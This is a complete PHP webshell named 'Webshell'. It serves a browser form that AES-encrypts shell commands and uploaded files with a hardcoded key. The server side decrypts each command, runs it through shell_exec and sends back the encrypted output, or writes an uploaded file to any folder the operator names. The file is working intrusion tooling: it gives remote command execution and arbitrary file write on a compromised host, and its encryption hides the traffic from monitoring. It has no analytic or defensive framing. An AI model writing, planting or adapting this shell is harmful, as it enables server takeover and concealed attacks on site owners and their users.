<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
?>
<?php if ($_SERVER['REQUEST_METHOD'] === 'GET') : ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <title>Webshell</title>
        <style>
            form {
                display: flex;
            }

            input {
                margin-right: 10px;
                width: 300px;
            }

            label {
                display: inline-block;
                width: 110px;
            }

            pre {
                margin-top: 20px;
            }
        </style>
    </head>

    <body>
        <div>
            <h2>Execute Command</h2>
            <form onsubmit="executeCommand(event)">
                <div>
                    <label for="cmd">Command:</label>
                    <input required type="text" id="cmd" name="cmd">
                </div>
                <button type="submit"><b>Execute</b></button>
            </form>
        </div>

        <div>
            <h2>Upload File</h2>
            <form onsubmit="uploadFile(event)" enctype="multipart/form-data">
                <div>
                    <label for="folder">Folder:</label>
                    <input type="text" id="folder" name="folder">
                </div>
                <div>
                    <input required type="file" id="file" name="file">
                </div>
                <button type="submit"><b>Upload</b></button>
            </form>
        </div>
        <b>
            <pre id="output"></pre>
        </b>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
        <script>
            const secretKey = '09384765120384756019283746509321';

            function encrypt(data, key, is_file) {
                const iv = CryptoJS.lib.WordArray.random(16);
                const encrypted = CryptoJS.AES.encrypt(data, CryptoJS.enc.Utf8.parse(key), {
                    iv: iv,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });

                return `${CryptoJS.enc.Hex.stringify(encrypted.ciphertext)}$${CryptoJS.enc.Hex.stringify(iv)}`

            }

            function decrypt(encryptedData, key, iv, is_file) {
                const ivByte = CryptoJS.enc.Hex.parse(iv);
                const ciphertext = CryptoJS.enc.Hex.parse(encryptedData);

                const decrypted = CryptoJS.AES.decrypt({
                    ciphertext: ciphertext
                }, CryptoJS.enc.Utf8.parse(key), {
                    iv: ivByte,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });

                return decrypted.toString(CryptoJS.enc.Utf8);
            }

            function executeCommand(event) {
                event.preventDefault();

                const cmd = document.getElementById('cmd').value;
                const encryptedCmd = encrypt(cmd, secretKey);

                const formData = new FormData();
                formData.append('cmd', encryptedCmd);

                fetch('shell.php', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.text())
                    .then(encryptedOutput => {
                        let parts = encryptedOutput.split('$');
                        let encryptedData = parts[0];
                        let iv = parts[1];
                        const output = decrypt(encryptedData, secretKey, iv);
                        document.getElementById('output').innerText = output;
                    });
            }

            function uploadFile(event) {
                event.preventDefault();

                const filePath = document.getElementById('folder').value;
                const encryptedFilePath = encrypt(filePath, secretKey);

                const formData = new FormData();
                formData.append('folder', encryptedFilePath);

                const file = document.getElementById('file').files[0];

                if (file) {
                    const reader = new FileReader();
                    reader.onloadend = function(event) {
                        const fileContent = event.target.result;
                        const encryptedFileContent = encrypt(CryptoJS.lib.WordArray.create(fileContent), secretKey);
                        formData.append('file', new Blob([encryptedFileContent], {
                            type: 'text/plain'
                        }), file.name);

                        fetch('shell.php', {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => response.text())
                            .then(encryptedOutput => {
                                let parts = encryptedOutput.split('$');
                                let encryptedData = parts[0];
                                let iv = parts[1];
                                const output = decrypt(encryptedData, secretKey, iv);
                                document.getElementById('output').innerText = output;
                            });
                    };

                    reader.readAsArrayBuffer(file);
                } else {
                    console.log("no file selected")
                }
            }
        </script>
    </body>

    </html>
<?php else : ?>
    <?php
    $secret_key = '09384765120384756019283746509321';

    // encrypt data
    function encrypt($data, $key){
        $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
        $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
        return bin2hex($encrypted) . '$' . bin2hex($iv);
    }

    // decrypt data
    function decrypt($encrypted_data, $key, $iv){
        $ciphertext = hex2bin($encrypted_data);
        $iv_bytes = hex2bin($iv);
        return openssl_decrypt($ciphertext, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv_bytes);
    }

    if (isset($_POST['cmd'])) {
        $parts = explode('$', $_POST['cmd']);
        $encrypted_data = $parts[0];
        $iv = $parts[1];
        $cmd = decrypt($encrypted_data, $secret_key, $iv);
        $cmd_output = shell_exec($cmd . " 2>&1");
        echo encrypt($cmd_output, $secret_key);

    } else if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $parts = explode('$', $_POST['folder']);
        $encrypted_data = $parts[0];
        $iv = $parts[1];
        $folder = decrypt($encrypted_data, $secret_key, $iv);
        if (empty($folder)) {
            $folder = '.';
        }

        $tmpName = $_FILES['file']['tmp_name'];
        $fileName = $_FILES['file']['name'];
        $parts = explode('$', file_get_contents($tmpName));
        $encrypted_data = $parts[0];
        $iv = $parts[1];
        $fileContent = decrypt($encrypted_data, $secret_key, $iv);

        try {
            if (file_put_contents($folder . "/" . $fileName, $fileContent) === false) {
                throw new Exception("Failed to write file to folder.");
            }
            echo encrypt("Upload successful", $secret_key);
        } catch (Exception $e) {
            echo encrypt($e->getMessage(), $secret_key);
        }
    }
    ?>
<?php endif; ?>